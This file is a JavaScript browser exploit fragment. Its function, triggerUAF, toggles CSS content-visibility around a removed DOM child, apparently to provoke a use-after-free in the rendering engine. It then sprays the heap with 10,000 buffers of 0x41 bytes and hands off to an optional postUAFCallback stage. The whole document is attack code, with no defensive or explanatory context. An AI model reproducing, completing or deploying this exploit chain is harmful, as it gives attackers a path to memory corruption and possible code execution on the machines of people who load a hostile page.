export function triggerUAF() {
  const container = document.createElement("div");
  const child = document.createElement("div");
  container.className = "container";
  child.className = "child";
  container.appendChild(child);
  document.body.appendChild(container);

  container.style.contentVisibility = "hidden";
  child.remove();

  setTimeout(() => {
    container.style.contentVisibility = "auto";
    let spray = [];
    for (let i = 0; i < 10000; i++) {
      let arr = new Uint8Array(0x1000);
      for (let j = 0; j < arr.length; j++) {
        arr[j] = 0x41;
      }
      spray.push(arr);
    }
    const log = document.getElementById("log");
    log.textContent += "[+] UAF triggered. Heap sprayed.\n";
    console.log("[+] UAF triggered. Heap sprayed.");
    if (typeof postUAFCallback === "function") postUAFCallback();
  }, 10);
}
